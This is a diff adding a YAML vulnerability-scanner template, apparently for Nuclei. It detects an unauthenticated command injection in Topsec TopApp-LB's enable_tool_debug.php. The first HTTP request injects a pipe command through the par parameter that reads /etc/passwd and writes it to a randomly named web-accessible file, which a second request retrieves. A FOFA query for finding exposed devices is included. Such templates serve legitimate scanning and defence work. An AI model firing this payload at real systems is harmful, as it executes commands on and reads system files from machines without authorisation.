@@ -1,0 +1,33 @@
+id: topsec-topapplb-enable-tool-debug-rce
+
+info:
+  name: 天融信 TopApp-LB enable_tool_debug.php 远程命令执行
+  author: peiqi
+  severity: critical
+  description: |
+    天融信 TopApp-LB 负载均衡系统 enable_tool_debug.php 对 par 参数过滤不足，未授权攻击者可通过命令拼接执行任意系统命令。
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/天融信/天融信%20TopApp-LB%20enable_tool_debug.php%20远程命令执行漏洞.md
+  metadata:
+    max-request: 2
+    fofa-query: app="天融信-TopApp-LB-负载均衡系统"
+    verified: true
+  tags: topsec,topapplb,rce
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+
+http:
+  - raw:
+      - |
+        GET /acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1%27%20|%20cat%20/etc/passwd%20%3E%20../../{{file_name}}.txt%20|%27 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{file_name}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && regex('root:.*:0:0:', body_2)"
